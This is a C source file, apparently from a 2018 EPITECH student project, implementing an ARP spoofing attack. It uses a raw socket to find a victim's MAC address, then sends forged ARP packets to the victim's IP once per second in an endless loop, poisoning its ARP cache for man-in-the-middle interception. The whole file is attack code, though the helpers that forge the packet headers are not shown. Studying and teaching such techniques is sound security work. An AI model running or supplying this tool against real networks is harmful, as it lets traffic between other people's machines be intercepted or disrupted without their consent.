/*
** EPITECH PROJECT, 2018
** arp_spoofing.c
** File description:
** arp_spoofing.c
*/

#include "arp_spoof.h"

void print_mac_address_victim(arp_packet_t packet_resp, data_t *data)
{
    printf("Found victim\'s MAC address: \'");
    for (int i = 0; i < 6; i++) {
        if (i > 0)
            printf(":");
        printf("%02x", packet_resp.arp->ar_sha[i]);
        data->dest_mac[i] = packet_resp.arp->ar_sha[i];
    }
    printf("\'\n");
}

void get_mac_victim(int sock, struct ifreq ifr, struct sockaddr_ll s, data_t *d)
{
    unsigned char buffer[MSG_MAX_LENGTH];
    arp_packet_t packet_req = init_arp_packet(buffer);
    arp_packet_t packet_resp = init_arp_packet(buffer);

    generate_ethhdr(packet_req.eth, ifr);
    generate_arphdr(packet_req.arp, ifr, *d);

    send_packet(sock, buffer, &s);

    bzero(buffer, MSG_MAX_LENGTH);

    while (42) {
        recv_packet(sock, buffer);
        if (htons(packet_resp.eth->h_proto) == ETH_P_ARP)
            break;
    }
    print_mac_address_victim(packet_resp, d);
}

void send_spoof_pack(int sock, unsigned char *b, struct sockaddr_ll s, data_t d)
{
    clock_t clock_start;
    clock_t clock_end;

    clock_start = clock();
    while (42) {
        clock_end = clock();
        if (((double)(clock_end - clock_start) / CLOCKS_PER_SEC) > 1.0) {
            send_packet(sock, b, &s);
            printf("Spoofed packet sent to \'");
            for (int i = 0; i < 4; i++) {
                if (i > 0)
                    printf(".");
                printf("%d", d.dest_ip[i]);
            }
            printf("\'\n");
            clock_start = clock();
        }
    }
}

void spoof_arp_packet(int sock, struct ifreq i, struct sockaddr_ll s, data_t d)
{
    unsigned char buffer[MSG_MAX_LENGTH];
    arp_packet_t packet_spoof = init_arp_packet(buffer);

    generate_ethhdr_spoof(packet_spoof.eth, i, d);
    generate_arphdr_spoof(packet_spoof.arp, i, d);

    send_spoof_pack(sock, buffer, s, d);
}

void arp_spoofing(data_t data)
{
    int sockfd = create_socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    struct ifreq ifr;
    int index = init_ifreq(&ifr, sockfd, data.infra);
    struct sockaddr_ll sockaddr = init_sockaddr_ll(index, ifr);

    get_mac_victim(sockfd, ifr, sockaddr, &data);

    spoof_arp_packet(sockfd, ifr, sockaddr, data);
    close(sockfd);
}
